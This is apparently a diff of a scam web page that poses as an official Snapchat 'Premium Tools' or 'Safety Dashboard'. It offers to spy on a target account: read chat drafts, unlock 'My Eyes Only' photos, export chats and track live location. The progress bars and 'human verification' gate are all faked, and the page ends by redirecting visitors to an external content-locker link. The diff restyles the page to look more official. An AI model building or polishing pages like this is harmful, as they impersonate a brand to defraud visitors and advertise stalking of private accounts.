@@ -3,87 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Snapchat Plus - Developer Analytics Portal</title>
+    <title>Snapchat Analytics Tools</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
         
         :root { 
             --snap-yellow: #FFFC00;
-            --snap-black: #050507;
-            --snap-card: rgba(18, 18, 24, 0.7);
-            --snap-border: rgba(255, 252, 0, 0.1);
+            --snap-black: #000000;
+            --snap-bg-light: #f7f7f9;
+            --snap-card: #ffffff;
+            --snap-text-dark: #16161a;
+            --snap-text-muted: #888d93;
         }
         
         body { 
             font-family: 'Plus Jakarta Sans', sans-serif; 
-            background: radial-gradient(circle at top, #12121a 0%, var(--snap-black) 100%); 
-            color: #ffffff; 
+            background-color: var(--snap-bg-light); 
+            color: var(--snap-text-dark); 
             overflow-x: hidden; 
             -webkit-tap-highlight-color: transparent; 
         }
 
-        .font-mono-tech {
-            font-family: 'Space Grotesk', monospace;
-        }
-
-        /* Premium Glassmorphism */
-        .glass-panel {
-            background: var(--snap-card);
-            backdrop-filter: blur(16px);
-            border: 1px solid var(--snap-border);
-            border-radius: 24px;
+        .snap-shadow {
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03);
         }
 
         .action-item { 
-            background: rgba(255, 255, 255, 0.02); 
-            border: 1px solid rgba(255,255,255,0.04);
-            border-radius: 20px; 
+            background: var(--snap-card); 
+            border-bottom: 1px solid #f0f0f2;
             cursor: pointer; 
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); 
-        }
-
-        .action-item:hover {
-            border-color: rgba(255, 252, 0, 0.3);
-            background: rgba(255, 252, 0, 0.02);
-            box-shadow: 0 10px 30px rgba(255, 252, 0, 0.04);
+            transition: all 0.2s ease; 
         }
 
         .action-item:active { 
-            transform: scale(0.98); 
+            background: #f2f2f5;
         }
 
-        .snap-btn-gradient {
-            background: linear-gradient(135deg, #FFFC00 0%, #ffea00 100%);
-            color: #000000;
-            box-shadow: 0 8px 24px rgba(255, 252, 0, 0.15);
-            transition: all 0.2s;
+        .snap-btn-yellow {
+            background-color: var(--snap-yellow);
+            color: var(--snap-black);
+            font-weight: 800;
         }
 
-        .snap-btn-gradient:active {
+        .snap-btn-yellow:active {
             transform: scale(0.98);
-            box-shadow: 0 4px 12px rgba(255, 252, 0, 0.1);
         }
 
-        /* Futuristic Image Scanner Action effect */
+        /* Snap Laser Scanner Style */
         .scanner-container {
             position: relative;
             width: 100%;
-            border-radius: 20px;
+            border-radius: 18px;
             overflow: hidden;
-            margin-bottom: 25px;
-            background: #09090d;
-            border: 1px solid rgba(255,255,255,0.05);
+            margin-bottom: 20px;
+            background: #eaeaea;
+            border: 1px solid #e1e1e4;
         }
 
         .scanner-img {
             width: 100%;
             height: auto;
             display: none;
-            filter: blur(12px) grayscale(30%);
+            filter: blur(10px);
             transform: scale(1.02);
-            transition: filter 1s ease;
         }
 
         .scan-laser {
@@ -94,7 +78,7 @@
             width: 100%;
             height: 4px;
             background: linear-gradient(to bottom, rgba(255, 252, 0, 0), #FFFC00, rgba(255, 252, 0, 0));
-            box-shadow: 0 0 15px #FFFC00, 0 0 30px #FFFC00;
+            box-shadow: 0 0 12px #FFFC00, 0 0 20px #FFFC00;
             animation: scanning 2s linear infinite;
             z-index: 10;
         }
@@ -107,7 +91,7 @@
 
         .sheet { 
             transform: translateY(100%); 
-            transition: transform 0.4s cubic-bezier(0.1, 0.9, 0.2, 1); 
+            transition: transform 0.35s cubic-bezier(0.1, 0.9, 0.2, 1); 
             z-index: 100; 
         }
         .sheet.active { 
@@ -116,207 +100,203 @@
 
         .bar-fill { 
             height: 100%; 
-            background: linear-gradient(90deg, #FFFC00, #fffa65); 
+            background: var(--snap-black); 
             width: 0%; 
             transition: width 0.2s linear; 
-            box-shadow: 0 0 10px rgba(255, 252, 0, 0.5);
         }
 
         #locker-overlay {
             display: none;
             position: fixed;
             inset: 0;
-            background: rgba(3, 3, 5, 0.95);
-            backdrop-filter: blur(30px);
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(15px);
             z-index: 500;
             flex-direction: column;
             align-items: center;
             justify-content: center;
         }
+
+        .snap-locker-card {
+            width: 88%;
+            max-width: 360px;
+            background: #ffffff;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.15);
+        }
     </style>
 </head>
-<body class="flex flex-col items-center px-4 pt-4 min-h-screen pb-12">
+<body class="flex flex-col items-center min-h-screen pb-12">
 
-    <!-- Top Premium Navigation Bar -->
-    <header class="w-full max-w-md flex justify-between items-center py-4 mb-6 border-b border-white/5">
+    <!-- Official Snapchat Top Header UI -->
+    <header class="w-full max-w-md bg-white flex justify-between items-center px-5 py-4 border-b border-zinc-100 sticky top-0 z-50">
         <div class="flex items-center gap-3">
-            <div class="w-10 h-10 rounded-2xl bg-white/5 flex items-center justify-center border border-white/10 shadow-inner">
-                <i class="fas fa-arrow-left text-xs text-zinc-400"></i>
+            <div class="w-9 h-9 rounded-full bg-zinc-100 flex items-center justify-center text-zinc-700">
+                <i class="fas fa-chevron-left text-sm"></i>
             </div>
             <div>
-                <h1 class="text-xs font-black uppercase tracking-widest text-zinc-400 flex items-center gap-1.5">
-                    <span class="inline-block w-1.5 h-1.5 rounded-full bg-[#FFFC00] animate-ping"></span>
-                    <span>Core Console v5.2</span>
+                <h1 class="text-sm font-extrabold tracking-tight flex items-center gap-1.5 text-black">
+                    <i class="fab fa-snapchat text-md text-[#FFFC00] drop-shadow-sm"></i>
+                    <span>Snapchat Premium Tools</span>
                 </h1>
-                <p class="text-sm font-black text-white font-mono-tech mt-0.5">Snapchat Link Node</p>
+                <p class="text-[10px] text-zinc-400 font-bold">Official Support Panel</p>
             </div>
         </div>
-        <div class="px-3 py-1.5 rounded-full bg-[#FFFC00]/10 border border-[#FFFC00]/20 text-[#FFFC00] text-[10px] font-bold font-mono-tech uppercase tracking-wider">
-            Secure Endpoint
-        </div>
+        <div class="w-2.5 h-2.5 rounded-full bg-emerald-500"></div>
     </header>
 
-    <!-- Main Workspace -->
-    <main class="w-full max-w-md flex-1 space-y-5">
+    <!-- Main Content Body -->
+    <main class="w-full max-w-md px-4 mt-4 space-y-4 flex-1">
         
-        <!-- Terminal Initialization Box -->
-        <div class="glass-panel p-5 shadow-2xl">
-            <div class="flex items-center justify-between mb-4">
-                <div class="flex items-center gap-2">
-                    <i class="fab fa-snapchat text-[#FFFC00] text-lg"></i>
-                    <span class="text-[10px] font-bold font-mono-tech text-zinc-400 uppercase tracking-wider">Authentication Gateway</span>
-                </div>
-                <div class="text-[9px] font-mono-tech text-zinc-600">SYS_ID: 994-A</div>
+        <!-- Target Connection Card -->
+        <div class="bg-white p-5 rounded-2xl snap-shadow border border-zinc-100">
+            <div class="flex items-center gap-2 mb-3">
+                <i class="fas fa-user-plus text-xs text-zinc-400"></i>
+                <label class="text-[11px] font-bold uppercase tracking-wider text-zinc-400">Enter Snapchat Account</label>
             </div>
             
             <div class="space-y-3">
                 <div class="relative">
-                    <div class="absolute left-4 top-1/2 -translate-y-1/2 flex items-center gap-1.5 text-zinc-500 font-bold text-sm">
-                        <span>@</span>
-                    </div>
-                    <input type="text" id="username" placeholder="enter snapchat target user" class="w-full bg-black/40 border border-white/5 rounded-xl pl-9 pr-4 py-4 outline-none text-sm font-bold text-white tracking-wide placeholder-zinc-700 transition focus:border-[#FFFC00]/40 font-mono-tech">
+                    <span class="absolute left-4 top-1/2 -translate-y-1/2 text-zinc-400 font-bold text-sm">@</span>
+                    <input type="text" id="username" placeholder="username" class="w-full bg-zinc-50 border border-zinc-200 rounded-xl pl-9 pr-4 py-3.5 outline-none text-sm font-bold text-black placeholder-zinc-400 transition focus:border-zinc-300">
                 </div>
-                <button onclick="handleConnect()" id="connBtn" class="snap-btn-gradient w-full py-4 rounded-xl font-black text-xs uppercase tracking-widest">
-                    Initialize Terminal Sync
+                <button onclick="handleConnect()" id="connBtn" class="snap-btn-yellow w-full py-3.5 rounded-xl text-xs uppercase tracking-wider transition-all">
+                    Connect Account
                 </button>
             </div>
             
-            <p id="error-msg" class="hidden text-red-400 text-xs mt-3 font-bold flex items-center gap-2">
-                <i class="fas fa-exclamation-triangle"></i> Invalid protocol boundaries. Minimum 4 characters required.
+            <p id="error-msg" class="hidden text-red-500 text-xs mt-2.5 font-bold flex items-center gap-1.5">
+                <i class="fas fa-circle-exclamation"></i> Error: Please type a valid username.
             </p>
         </div>
         
-        <!-- Synchronized Success Board -->
-        <div id="conn-status" class="hidden glass-panel p-4 border-[#FFFC00]/20 bg-[#FFFC00]/[0.02] flex items-center justify-between animate-fadeIn">
-            <div class="flex items-center gap-3.5">
-                <div class="w-11 h-11 rounded-xl bg-gradient-to-tr from-[#FFFC00] to-yellow-300 flex items-center justify-center text-black text-lg shadow-lg">
+        <!-- Account Status Verified Badge -->
+        <div id="conn-status" class="hidden bg-white border border-zinc-100 rounded-xl p-4 flex items-center justify-between animate-fadeIn snap-shadow">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-full bg-[#FFFC00] flex items-center justify-center text-black text-md shadow-sm">
                     <i class="fab fa-snapchat"></i>
                 </div>
                 <div>
-                    <div class="flex items-center gap-1.5">
-                        <p class="font-black text-sm tracking-wide text-white" id="targetNameDisplay"></p>
-                        <i class="fas fa-shield-check text-sky-400 text-xs"></i>
+                    <div class="flex items-center gap-1">
+                        <p class="font-extrabold text-sm text-black" id="targetNameDisplay"></p>
+                        <i class="fas fa-circle-check text-sky-400 text-xs"></i>
                     </div>
-                    <p class="text-[11px] text-zinc-500 mt-0.5 font-mono-tech">Handshake: <span class="text-emerald-400 font-bold">TUNNEL_OPEN</span></p>
+                    <p class="text-[11px] text-emerald-500 font-bold mt-0.5">Connection Established</p>
                 </div>
             </div>
-            <div class="w-2.5 h-2.5 rounded-full bg-emerald-500 shadow-[0_0_10px_#10b981]"></div>
         </div>
 
-        <!-- 5 Functional Options -->
-        <div id="actions-grid" class="opacity-15 pointer-events-none transition-all duration-700 space-y-3">
+        <!-- 5 Simple English Options -->
+        <div id="actions-grid" class="opacity-25 pointer-events-none transition-all duration-500 bg-white rounded-2xl overflow-hidden snap-shadow border border-zinc-100">
             
-            <div onclick="openAction('Real-time Keystroke Interception Protocol', 'typing')" class="action-item p-4.5 flex items-center justify-between">
+            <!-- Item 1 -->
+            <div onclick="openAction('View Active Chat Drafts', 'typing')" class="action-item p-4.5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
-                    <div class="w-12 h-12 bg-white/5 rounded-xl flex items-center justify-center text-[#FFFC00] border border-white/5"><i class="fas fa-keyboard text-sm"></i></div>
-                    <div><h3 class="font-bold text-sm text-white">Live Typing Feed</h3><p class="text-[11px] text-zinc-500 mt-0.5">Intercept active keystroke buffers</p></div>
+                    <div class="w-10 h-10 bg-zinc-50 rounded-xl flex items-center justify-center text-zinc-700"><i class="fas fa-comment-dots text-sm"></i></div>
+                    <div><h3 class="font-bold text-[14px] text-black">View Active Chat Drafts</h3><p class="text-[11px] text-zinc-400 mt-0.5">See live unsent texts and active typing</p></div>
                 </div>
-                <div class="w-7 h-7 rounded-lg bg-white/5 flex items-center justify-center border border-white/5 text-zinc-600 text-xs"><i class="fas fa-chevron-right"></i></div>
+                <i class="fas fa-chevron-right text-zinc-300 text-xs mr-1"></i>
             </div>
 
-            <div onclick="openAction('Algorithmic Best Friends Index Lookup', 'friends')" class="action-item p-4.5 flex items-center justify-between">
+            <!-- Item 2 -->
+            <div onclick="openAction('Show Top Best Friends', 'friends')" class="action-item p-4.5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
-                    <div class="w-12 h-12 bg-white/5 rounded-xl flex items-center justify-center text-[#FFFC00] border border-white/5"><i class="fas fa-user-group text-xs"></i></div>
-                    <div><h3 class="font-bold text-sm text-white">Decrypt Best Friends</h3><p class="text-[11px] text-zinc-500 mt-0.5">Map top interaction matrix frequencies</p></div>
+                    <div class="w-10 h-10 bg-zinc-50 rounded-xl flex items-center justify-center text-zinc-700"><i class="fas fa-heart text-sm"></i></div>
+                    <div><h3 class="font-bold text-[14px] text-black">Show Top Best Friends</h3><p class="text-[11px] text-zinc-400 mt-0.5">List the top closest friends on the account</p></div>
                 </div>
-                <div class="w-7 h-7 rounded-lg bg-white/5 flex items-center justify-center border border-white/5 text-zinc-600 text-xs"><i class="fas fa-chevron-right"></i></div>
+                <i class="fas fa-chevron-right text-zinc-300 text-xs mr-1"></i>
             </div>
 
-            <div onclick="openAction('Encrypted Vault Bypass (My Eyes Only)', 'eyes')" class="action-item p-4.5 flex items-center justify-between">
+            <!-- Item 3 -->
+            <div onclick="openAction('Unlock My Eyes Only Memories', 'eyes')" class="action-item p-4.5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
-                    <div class="w-12 h-12 bg-white/5 rounded-xl flex items-center justify-center text-[#FFFC00] border border-white/5"><i class="fas fa-lock text-xs"></i></div>
-                    <div><h3 class="font-bold text-sm text-white">Bypass 'My Eyes Only'</h3><p class="text-[11px] text-zinc-500 mt-0.5">Decrypt security layers over private vaults</p></div>
+                    <div class="w-10 h-10 bg-zinc-50 rounded-xl flex items-center justify-center text-zinc-700"><i class="fas fa-lock text-sm"></i></div>
+                    <div><h3 class="font-bold text-[14px] text-black">Unlock 'My Eyes Only' Memories</h3><p class="text-[11px] text-zinc-400 mt-0.5">View protected photos inside the hidden vault</p></div>
                 </div>
-                <div class="w-7 h-7 rounded-lg bg-white/5 flex items-center justify-center border border-white/5 text-zinc-600 text-xs"><i class="fas fa-chevron-right"></i></div>
+                <i class="fas fa-chevron-right text-zinc-300 text-xs mr-1"></i>
             </div>
 
-            <div onclick="openAction('Database Query: Chat History Logs', 'chat')" class="action-item p-4.5 flex items-center justify-between">
+            <!-- Item 4 -->
+            <div onclick="openAction('Export Full Chat History', 'chat')" class="action-item p-4.5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
-                    <div class="w-12 h-12 bg-white/5 rounded-xl flex items-center justify-center text-[#FFFC00] border border-white/5"><i class="fas fa-message text-xs"></i></div>
-                    <div><h3 class="font-bold text-sm text-white">Retrieve Chat History</h3><p class="text-[11px] text-zinc-500 mt-0.5">Recompile historical text/media sequences</p></div>
+                    <div class="w-10 h-10 bg-zinc-50 rounded-xl flex items-center justify-center text-zinc-700"><i class="fas fa-folder-open text-sm"></i></div>
+                    <div><h3 class="font-bold text-[14px] text-black">Export Full Chat History</h3><p class="text-[11px] text-zinc-400 mt-0.5">Download all texts and saved chat media</p></div>
                 </div>
-                <div class="w-7 h-7 rounded-lg bg-white/5 flex items-center justify-center border border-white/5 text-zinc-600 text-xs"><i class="fas fa-chevron-right"></i></div>
+                <i class="fas fa-chevron-right text-zinc-300 text-xs mr-1"></i>
             </div>
 
-            <div onclick="openAction('Geospatial Live Triangulation Protocol', 'location')" class="action-item p-4.5 flex items-center justify-between">
+            <!-- Item 5 -->
+            <div onclick="openAction('Track Current SnapMap Location', 'location')" class="action-item p-4.5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
-                    <div class="w-12 h-12 bg-white/5 rounded-xl flex items-center justify-center text-[#FFFC00] border border-white/5"><i class="fas fa-location-dot text-xs"></i></div>
-                    <div><h3 class="font-bold text-sm text-white">Reveal Live Location</h3><p class="text-[11px] text-zinc-500 mt-0.5">Triangulate terminal GPS coordinates</p></div>
+                    <div class="w-10 h-10 bg-zinc-50 rounded-xl flex items-center justify-center text-zinc-700"><i class="fas fa-map-location-dot text-sm"></i></div>
+                    <div><h3 class="font-bold text-[14px] text-black">Track Current SnapMap Location</h3><p class="text-[11px] text-zinc-400 mt-0.5">Get live map coordinates and active status</p></div>
                 </div>
-                <div class="w-7 h-7 rounded-lg bg-white/5 flex items-center justify-center border border-white/5 text-zinc-600 text-xs"><i class="fas fa-chevron-right"></i></div>
+                <i class="fas fa-chevron-right text-zinc-300 text-xs mr-1"></i>
             </div>
 
         </div>
     </main>
 
-    <!-- Footer Information -->
-    <footer class="mt-16 text-center">
-        <p class="text-[9px] font-mono-tech uppercase tracking-[0.3em] text-zinc-600">Snapchat Mainframe Control Node Matrix • 2026</p>
+    <!-- Bottom Footer Layout -->
+    <footer class="mt-12 text-center opacity-40">
+        <p class="text-[10px] font-bold text-zinc-400 uppercase tracking-wider">Snapchat Inc. Safety Dashboard • 2026</p>
     </footer>
 
-    <!-- Interactive Execution Slide Sheet WITH NEW LASER SCANNER -->
+    <!-- Simple & Official Action Sheet Slider -->
     <div id="action-sheet" class="fixed inset-0 z-[150] hidden">
-        <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="closeActionSheet()"></div>
-        <div class="absolute bottom-0 w-full bg-[#0b0b0f] rounded-t-[36px] p-6 text-center border-t border-white/5 sheet max-w-md mx-auto left-0 right-0 shadow-2xl">
-            <div class="w-12 h-1.5 bg-zinc-800 mx-auto mb-6 rounded-full"></div>
+        <div class="absolute inset-0 bg-black/40 backdrop-blur-xs" onclick="closeActionSheet()"></div>
+        <div class="absolute bottom-0 w-full bg-white rounded-t-[28px] p-6 text-center sheet max-w-md mx-auto left-0 right-0 shadow-xl">
+            <div class="w-10 h-1 bg-zinc-200 mx-auto mb-5 rounded-full"></div>
             
-            <!-- Dynamic Futuristic Scanner Container -->
+            <!-- Dynamic Image Scanner (Visual Hype) -->
             <div class="scanner-container">
                 <div class="scan-laser" id="laser"></div>
-                <img id="action-preview-img" class="scanner-img" src="" alt="Data Sandbox Preview">
+                <img id="action-preview-img" class="scanner-img" src="" alt="Cache Data Preview">
             </div>
 
-            <h4 id="r-title" class="text-md font-bold tracking-wide mb-2 text-white"></h4>
-            <p class="text-xs text-zinc-500 mb-6 max-w-xs mx-auto leading-relaxed">Ready to route traffic pipelines through the selected memory blocks. This action requires safe buffer extraction.</p>
+            <h4 id="r-title" class="text-base font-extrabold mb-1.5 text-black"></h4>
+            <p class="text-xs text-zinc-400 mb-6 max-w-xs mx-auto leading-normal">The application will now safely process and fetch the selected media data packages.</p>
             
-            <button onclick="runExploit()" class="w-full snap-btn-gradient font-black py-4 rounded-xl text-xs uppercase tracking-widest shadow-xl">
-                Compile Live Pipeline
+            <button onclick="runExploit()" class="w-full snap-btn-yellow font-extrabold py-3.5 rounded-xl text-xs uppercase tracking-wider shadow-sm">
+                Start Processing
             </button>
         </div>
     </div>
 
-    <!-- Processing Fullscreen Panel with live size ticker -->
-    <div id="proc-modal" class="hidden fixed inset-0 z-[300] bg-black/95 backdrop-blur-xl flex items-center justify-center p-4">
-        <div class="glass-panel w-full max-w-sm p-6 text-left relative overflow-hidden shadow-2xl border-white/10">
-            <div class="flex items-center justify-between mb-4">
-                <div class="flex items-center gap-2">
-                    <i class="fab fa-snapchat text-[#FFFC00] text-sm animate-spin"></i>
-                    <span id="p-status" class="text-[10px] font-bold font-mono-tech text-zinc-400 uppercase tracking-wider">Mapping Clusters...</span>
-                </div>
-                <span id="p-percent" class="text-xs font-mono-tech font-black text-[#FFFC00]">0%</span>
+    <!-- Clean Official Processing Modal Screen -->
+    <div id="proc-modal" class="hidden fixed inset-0 z-[300] bg-white flex items-center justify-center p-6">
+        <div class="w-full max-w-sm text-center">
+            <div class="w-16 h-16 rounded-full bg-zinc-50 border border-zinc-100 mx-auto mb-6 flex items-center justify-center shadow-sm">
+                <i class="fab fa-snapchat text-black text-2xl animate-bounce"></i>
             </div>
             
-            <div class="h-1.5 bg-white/5 rounded-full mb-4 overflow-hidden">
+            <div class="flex items-center justify-between max-w-xs mx-auto mb-2 text-xs font-bold text-zinc-500">
+                <span id="p-status">Fetching safe database...</span>
+                <span id="p-percent" class="text-black">0%</span>
+            </div>
+            
+            <div class="h-1.5 bg-zinc-100 rounded-full max-w-xs mx-auto overflow-hidden">
                 <div id="bar" class="bar-fill"></div>
             </div>
-
-            <!-- Fake Data Counter to raise engagement -->
-            <div class="flex justify-between items-center text-[10px] font-mono-tech text-zinc-500 mb-4 px-1">
-                <span>BUFFER SIZE: <span id="p-size" class="text-white font-bold">0</span> KB</span>
-                <span>STATUS: FETCHING</span>
-            </div>
             
-            <div class="bg-black/80 rounded-xl p-4 border border-white/5 h-36 flex flex-col justify-end font-mono-tech text-[10px] text-zinc-500 space-y-1.5">
-                <p id="p-log-1" class="opacity-20">> COMPILING PACKET STRUCTURES</p>
-                <p id="p-log-2" class="opacity-40">> SYNCING METADATA REGISTERS</p>
-                <p id="p-log" class="text-[#FFFC00] font-bold">> ATTACHING COMPILER ROUTE...</p>
-            </div>
+            <p class="text-[10px] text-zinc-400 uppercase tracking-widest mt-4 font-bold">Please keep this window open</p>
         </div>
     </div>
 
-    <!-- Premium Dark Snapchat Human Locker Verification Overlay -->
+    <!-- Official Style Light Human Locker Verification Overlay -->
     <div id="locker-overlay">
-        <div class="glass-panel w-[90%] max-w-[380px] overflow-hidden shadow-2xl border-[#FFFC00]/20 animate-scaleUp">
+        <div class="snap-locker-card border border-zinc-100">
             <div class="p-6 text-center flex flex-col items-center justify-center">
-                <div class="w-16 h-16 rounded-2xl bg-[#FFFC00]/5 border border-[#FFFC00]/20 mb-5 flex items-center justify-center shadow-inner">
-                    <i class="fas fa-shield-check text-[#FFFC00] text-2xl animate-pulse"></i>
+                <div class="w-14 h-14 rounded-full bg-zinc-50 border border-zinc-100 mb-4 flex items-center justify-center shadow-sm">
+                    <i class="fas fa-user-shield text-zinc-800 text-xl animate-pulse"></i>
                 </div>
-                <h3 class="text-sm font-black uppercase tracking-widest text-white font-mono-tech">Human Verification Gate</h3>
-                <p class="text-xs text-zinc-400 mt-2.5 max-w-xs leading-relaxed">To de-crypt the compiled image caches and query sheets, you must bypass our safety gateway signature.</p>
+                <h3 class="text-sm font-extrabold uppercase tracking-wider text-black">Security Verification</h3>
+                <p class="text-xs text-zinc-500 mt-2 max-w-xs leading-relaxed">To complete the data download and remove the image preview blur, please complete the quick anti-bot check below.</p>
                 
-                <div class="w-full mt-6 bg-black/50 p-4 rounded-xl border border-white/5 text-left flex items-start gap-3">
-                    <i class="fas fa-circle-info text-[#FFFC00] text-xs mt-0.5"></i>
-                    <p class="text-[11px] text-zinc-500 font-medium leading-normal">Automated scripts are blocked natively to ensure endpoints do not experience overflow terminations.</p>
+                <div class="w-full mt-5 bg-zinc-50 p-4 rounded-xl border border-zinc-100 text-left flex items-start gap-3">
+                    <i class="fas fa-circle-info text-[#FFFC00] text-xs mt-0.5 drop-shadow-sm"></i>
+                    <p class="text-[11px] text-zinc-400 font-medium leading-normal">Verification confirms you are a human user to prevent high-speed automated data spam.</p>
                 </div>
             </div>
         </div>
@@ -330,7 +310,7 @@
                 setTimeout(() => el.querySelector('.sheet').classList.add('active'), 10);
             } else {
                 el.querySelector('.sheet').classList.remove('active');
-                setTimeout(() => el.classList.add('hidden'), 400);
+                setTimeout(() => el.classList.add('hidden'), 350);
             }
         }
 
@@ -341,15 +321,15 @@
             const err = document.getElementById('error-msg');
             
             if(user.length < 4) { 
-                inp.classList.add('border-red-500'); 
+                inp.classList.add('border-red-400'); 
                 err.classList.remove('hidden'); 
                 return; 
             }
             
-            inp.classList.remove('border-red-500');
+            inp.classList.remove('border-red-400');
             err.classList.add('hidden');
             
-            if(btn.innerText === "TERMINATE GATEWAY") { 
+            if(btn.innerText === "DISCONNECT ACCOUNT") { 
                 location.reload(); 
                 return; 
             }
@@ -359,16 +339,16 @@
             
             setTimeout(() => {
                 btn.disabled = false; 
-                btn.innerText = "TERMINATE GATEWAY";
-                btn.className = "bg-red-950/20 border border-red-500/20 text-red-400 w-full py-4 rounded-xl font-black text-xs uppercase tracking-widest font-mono-tech transition-all";
+                btn.innerText = "DISCONNECT ACCOUNT";
+                btn.className = "bg-zinc-100 border border-zinc-200 text-zinc-500 w-full py-3.5 rounded-xl font-bold text-xs uppercase tracking-wider transition-all";
                 
                 document.getElementById('conn-status').classList.remove('hidden');
-                document.getElementById('targetNameDisplay').innerText = '@' + user;
+                document.getElementById('targetNameDisplay').innerText = 'Snapchat Account: @' + user;
                 
                 const grid = document.getElementById('actions-grid');
-                grid.classList.replace('opacity-15', 'opacity-100');
+                grid.classList.replace('opacity-25', 'opacity-100');
                 grid.style.pointerEvents = 'auto';
-            }, 1600);
+            }, 1400);
         }
 
         function openAction(desc, type) {
@@ -379,7 +359,7 @@
             
             previewImg.src = type + '.jpg'; 
             previewImg.style.display = 'block';
-            laser.style.display = 'block'; // تفعيل شريط الليزر التشويقي عند الفتح
+            laser.style.display = 'block'; 
             
             toggleSheet('action-sheet');
         }
@@ -393,40 +373,18 @@
             setTimeout(() => {
                 document.getElementById('proc-modal').classList.remove('hidden');
                 let p = 0; 
-                let currentSize = 0;
-                
                 const bar = document.getElementById('bar');
                 const percent = document.getElementById('p-percent');
                 const status = document.getElementById('p-status');
-                const sizeTicker = document.getElementById('p-size');
-                
-                const log = document.getElementById('p-log');
-                const log1 = document.getElementById('p-log-1');
-                const log2 = document.getElementById('p-log-2');
                 
                 const interval = setInterval(() => {
                     p += 1; 
-                    currentSize += Math.floor(Math.random() * 142) + 45; // العداد الوهمي للملفات
-                    
                     bar.style.width = p + '%'; 
                     percent.innerText = p + '%';
-                    sizeTicker.innerText = currentSize.toLocaleString();
                     
-                    if(p == 25) {
-                        status.innerText = "Siphoning Buffers...";
-                        log1.innerText = "> [OK] Secure socket connection established";
-                        log.innerText = "> [SYS] Downloading target node segments...";
-                    }
-                    if(p == 55) {
-                        status.innerText = "Reassembling Caches...";
-                        log2.innerText = "> [OK] Node segments parsed successfully";
-                        log.innerText = "> [SYS] Rendering visual metadata tables...";
-                    }
-                    if(p == 85) {
-                        status.innerText = "Finalizing Build...";
-                        log1.innerText = "> [OK] Extraction complete without overflows";
-                        log.innerText = "> [SYS] Encoding packages into dynamic sheets...";
-                    }
+                    if(p == 30) { status.innerText = "Connecting secure server..."; }
+                    if(p == 60) { status.innerText = "Preparing media assets..."; }
+                    if(p == 85) { status.innerText = "Packaging files..."; }
                     
                     if(p >= 100) {
                         clearInterval(interval);
@@ -441,12 +399,12 @@
                             
                             setTimeout(() => {
                                 window.location.href = "https://appsave.space/cl/i/qn6xx7";
-                            }, 400);
+                            }, 450);
 
                         }, 400);
                     }
                 }, 35);
-            }, 400);
+            }, 350);
         }
     </script>
 </body>
